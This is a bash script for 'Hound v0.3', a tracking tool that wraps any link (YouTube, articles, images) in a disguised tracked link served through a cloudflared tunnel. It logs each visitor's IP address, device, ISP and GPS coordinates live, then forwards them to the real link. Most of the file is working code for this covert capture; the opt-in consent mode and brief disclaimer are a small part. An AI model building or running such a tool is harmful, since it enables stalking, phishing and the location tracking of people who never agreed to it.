#!/bin/bash
# Hound v 0.3
# Powered by TechChip
# visit https://youtube.com/techchipnet
#
# v0.3 - custom link mode
#   Ask for any link (YouTube, Google, image, video, article...), build a
#   tracked link around it, capture IP / device / GPS data and only then
#   forward the visitor to that link. The original built-in Hound page still
#   works when no link is given.

trap 'printf "\n"; stop' 2

target_url=""
hound_mode="track"
data_offset=0

banner() {
clear
printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n'
printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
printf " \e[1;93m      Hound Ver 0.3 - by Anil Parashar [TechChip]\e[0m \n"
printf " \e[1;92m      www.techchip.net | youtube.com/techchipnet \e[0m \n"
printf "\e[1;90m Hound is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
printf "\e[1;90m v0.3: paste ANY link and get a tracked link that redirects to it.\e[0m \n"
printf "\n"
}

usage() {
printf "\e[1;92mUsage:\e[0m\n"
printf "  bash hound.sh                 interactive (asks for the link)\n"
printf "  bash hound.sh -u <URL>        start directly with a link\n"
printf "  bash hound.sh --consent       explicit location-share page (visitor taps to allow)\n"
printf "  bash hound.sh --no-geoip      do not use the server side IP geolocation\n"
printf "  bash hound.sh -h              show this help\n\n"
printf "\e[1;90mExample:\e[0m\n"
printf "  bash hound.sh -u 'https://www.youtube.com/watch?v=IiJRyVmITgI'\n\n"
printf "\e[1;90mOnly use this tool on devices and people that gave you explicit\npermission. Tracking somebody without consent is illegal.\e[0m\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }

}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

trim() {
local s="$1"
s="${s#"${s%%[![:space:]]*}"}"
s="${s%"${s##*[![:space:]]}"}"
printf '%s' "$s"
}

# Validates a link and adds https:// when the scheme is missing.
# Returns non zero (and prints nothing) for anything that is not http(s).
normalize_url() {
local u
u=$(trim "$1")
[[ -z "$u" ]] && return 1
if [[ ! "$u" =~ ^[A-Za-z][A-Za-z0-9+.-]*:// ]]; then
u="https://$u"
fi
if [[ ! "$u" =~ ^https?://[^[:space:]]+$ ]]; then
return 1
fi
printf '%s' "$u"
}

ask_target_url() {
local input normalized
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m?\e[0m\e[1;93m] Paste the link you want to mask:\e[0m\n"
printf "\e[1;90m    YouTube, Google, an image, a video, an article... any http(s) link.\e[0m\n"
printf "\e[1;90m    The visitor sees that link after the tracker captured their data.\e[0m\n"
printf "\e[1;90m    Leave empty to use the built-in Hound page instead.\e[0m\n"
while true; do
printf "    \e[1;92m>\e[0m "
read -r input
if [[ -z "$(trim "$input")" ]]; then
target_url=""
return 0
fi
if normalized=$(normalize_url "$input"); then
target_url="$normalized"
return 0
fi
printf "\e[1;31m[!] Not a valid link. Example: https://www.youtube.com/watch?v=xxxx\e[0m\n"
done
}

file_size() {
if [[ -e "$1" ]]; then
local s
s=$(wc -c < "$1" 2>/dev/null | tr -d '[:space:]')
printf '%s' "${s:-0}"
else
printf '0'
fi
}

print_report_block() {
local line
while IFS= read -r line; do
line=${line%$'\r'}
case "$line" in
"") ;;
*"GPS Lat Long"*|*"Information Gathering Report"*|*"Network & ISP"*)
printf "\e[1;92m  %s\e[0m\n" "$line" ;;
Latitude:*|Longitude:*|"Map Location:"*|"Google Earth:"*|"Accuracy:"*)
printf "\e[1;93m  %s\e[0m\n" "$line" ;;
City:*|Country:*|"ISP Info:"*|"AS Name:"*|"Proxy:"*|"Hosting:"*|"Time_zone:"*|"Region name:"*)
printf "  \e[1;77m%s\e[0m\n" "$line" ;;
*) printf "  %s\n" "$line" ;;
esac
done
}

print_ip_report() {
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target opened the link!\e[0m\n"
local line
while IFS= read -r line; do
line=${line%$'\r'}
case "$line" in
IP:*) printf "  \e[1;93m%-13s\e[0m%s\n" "IP:" "${line#IP:}" ;;
User-Agent:*) printf "  \e[1;93m%-13s\e[0m%s\n" "User-Agent:" "${line#User-Agent:}" ;;
Location:*) printf "  \e[1;93m%-13s\e[0m%s\n" "Location:" "${line#Location:}" ;;
ISP:*) printf "  \e[1;93m%-13s\e[0m%s\n" "ISP/Org:" "${line#ISP:}" ;;
Coordinates:*) printf "  \e[1;93m%-13s\e[0m%s\n" "Coordinates:" "${line#Coordinates:}" ;;
"Google Maps:"*) printf "  \e[1;93m%-13s\e[0m%s\n" "Map:" "${line#Google Maps:}" ;;
Time:*) printf "  \e[1;93m%-13s\e[0m%s\n" "Time:" "${line#Time:}" ;;
Referer:*) printf "  \e[1;93m%-13s\e[0m%s\n" "Referer:" "${line#Referer:}" ;;
---*) ;;
*) printf "  %s\n" "$line" ;;
esac
done < ip.txt
}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
data_offset=$(file_size data.txt)
while [ true ]; do

if [[ -s "ip.txt" ]]; then
print_ip_report
cat ip.txt >> saved.ip.txt
printf '%s\n' "----------------------------------------" >> saved.ip.txt
rm -f ip.txt
fi

local size
size=$(file_size data.txt)
if [ "$size" -gt "$data_offset" ]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Live report from target\e[0m\n"
tail -c +$((data_offset + 1)) data.txt | print_report_block
data_offset=$size
fi

sleep 0.5
done
}

start_php() {
local port="$1"
pkill -f "php -S 127.0.0.1:${port}" > /dev/null 2>&1
HOUND_TARGET_URL="$target_url" HOUND_MODE="$hound_mode" HOUND_GEOIP="${HOUND_GEOIP:-1}" php -S "127.0.0.1:${port}" > /dev/null 2>&1 &
sleep 1
}

print_link() {
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Your tracked link:\e[0m\n"
printf "    \e[1;77m%s\e[0m\n" "$1"
if [[ -n "$target_url" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Visitors are forwarded to:\e[0m\e[1;77m %s\e[0m\n" "$target_url"
fi
printf "\e[1;90m    Send this link to the target. Every open is shown live below.\e[0m\n"
if [[ "$hound_mode" == "consent" ]]; then
printf "\e[1;90m    Consent mode: no IP log, only the location the visitor agreed to share.\e[0m\n"
fi
}

cf_server() {

if [[ -e cloudflared ]]; then
echo "Cloudflared already installed."
else
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
arch=$(uname -m)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
else
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
fi
fi
chmod +x cloudflared
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
start_php 3333
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm -f cf.log > /dev/null 2>&1 &
./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
sleep 6
link=""
for ((i = 0; i < 20; i++)); do
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' "cf.log" 2>/dev/null | head -n1)
[[ -n "$link" ]] && break
sleep 1
done
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
exit 1
fi
print_link "$link"
checkfound
}

local_server() {
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
start_php 8080
if [[ "$hound_mode" == "consent" ]]; then
printf "\e[1;31m[!] Localhost is http://, browsers refuse geolocation there.\e[0m\n"
printf "\e[1;90m    Use the cloudflared https link (answer Y) for the location prompt.\e[0m\n"
fi
print_link "http://127.0.0.1:8080"
checkfound
}

hound() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
fi
touch data.txt
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi
sed -e '/tc_payload/r payload' index_chat.html > index.html
if [[ -z "$target_url" ]]; then
ask_target_url
fi
printf "\n"
if [[ "$hound_mode" == "consent" ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Consent mode: the visitor sees what is collected and taps to allow.\e[0m\n"
fi
if [[ -n "$target_url" ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Custom link mode: tracking, then redirecting to\e[0m\e[1;77m %s\e[0m\n" "$target_url"
else
printf "\e[1;90m[\e[0m+\e[1;90m] Built-in Hound page mode (no custom link).\e[0m\n"
fi
default_option_server="Y"
read -r -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
cf_server
sleep 1
else
local_server
sleep 1
fi
}

raw_url=""
while [[ $# -gt 0 ]]; do
case "$1" in
-u|--url)
shift
if [[ $# -eq 0 || -z "$1" ]]; then
printf "\e[1;31m[!] -u/--url needs a link, e.g. -u 'https://youtube.com/watch?v=xxxx'\e[0m\n"
exit 1
fi
raw_url="$1"
;;
--consent)
hound_mode="consent"
;;
--no-geoip)
HOUND_GEOIP="0"
;;
-h|--help)
usage
exit 0
;;
*)
printf "\e[1;31m[!] Unknown option: %s\e[0m\n\n" "$1"
usage
exit 1
;;
esac
shift
done

banner
dependencies

if [[ -n "$raw_url" ]]; then
if ! target_url=$(normalize_url "$raw_url"); then
printf "\e[1;31m[!] Invalid link: %s\e[0m\n" "$raw_url"
printf "\e[1;90m    Use a link starting with http:// or https://\e[0m\n"
exit 1
fi
fi

hound
